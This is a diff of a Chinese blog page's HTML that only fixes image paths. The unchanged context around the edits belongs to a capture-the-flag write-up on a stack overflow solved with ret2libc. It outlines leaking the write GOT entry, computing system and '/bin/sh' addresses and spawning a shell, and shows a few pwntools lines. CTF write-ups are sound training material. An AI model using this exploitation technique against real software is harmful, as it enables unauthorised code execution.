@@ -38,7 +38,7 @@
 <p>考点：</p>
 <p>1、栈溢出</p>
 <p>2、ret2libc</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200406225846093.png" alt="image-20200406225846093"></p>
+<p><img src="/images/image-20200406225846093.png" alt="image-20200406225846093"></p>
 <p>使用的是kali2020，libc的原因本地打不通，远程可以打</p>
 <p>利用write_plt打印出write_got，计算基地址偏移，计算system和&rdquo;/bin/sh&quot;地址，然后溢出执行system(&quot;/bin/sh&quot;)</p>
 <p>第一个payload中执行完write返回地址为mian，让程序能够第二次执行read()</p>
@@ -75,7 +75,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span>
 sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Input:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload)
 sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200406215303076.png" alt="image-20200406215303076"></p>
+</code></pre></div><p><img src="/images/image-20200406215303076.png" alt="image-20200406215303076"></p>
 
 </main>
 
